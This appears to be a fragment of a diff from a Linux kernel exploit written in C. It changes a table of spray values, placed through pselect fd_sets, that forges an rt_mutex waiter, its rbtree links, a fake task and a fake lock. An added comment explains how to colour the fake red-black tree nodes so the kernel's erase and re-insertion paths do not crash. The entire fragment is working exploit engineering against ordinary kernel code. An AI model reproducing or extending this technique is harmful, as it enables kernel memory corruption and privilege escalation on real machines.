@@ -139,13 +139,21 @@ static void prepare_slide_pselect_fdsets_shifted(
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
+    /* Page-contained fake graph + rbtree color discipline:
+     * - parents MUST be |1 (RED): rb_erase of a BLACK node runs
+     *   __rb_erase_color which dereferences the sibling of an in-page stub
+     *   (all-zero) -> NULL deref panic. RED leaf erase is side-effect free.
+     * - children NULL, waiter->task/lock point back into the page.
+     * - fake_w0 itself is planted BLACK (util.c) so re-insertion of the RED
+     *   waiter never triggers the red-red gparent rotation (parent==NULL
+     *   deref). */
+    {0, fake_w0 - W0_OFF + RIGHT_OFF + 1, "tree_pc"},
     {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
-    {3, SLIDE_LOGGERS_0_1, "pi_parent"},
+    {2, 0, "tree_left"},
+    {3, fake_w0 - W0_OFF + LEFT_OFF + 1, "pi_parent"},
     {4, 0, "pi_right"},
-    {5, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
-    {6, SLIDE_INIT_TASK, "task"},
+    {5, 0, "pi_left"},
+    {6, fake_task, "task"},
     {7, fake_lock, "lock"},
     {8, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_state_prio"},
     {9, 0, "deadline"},
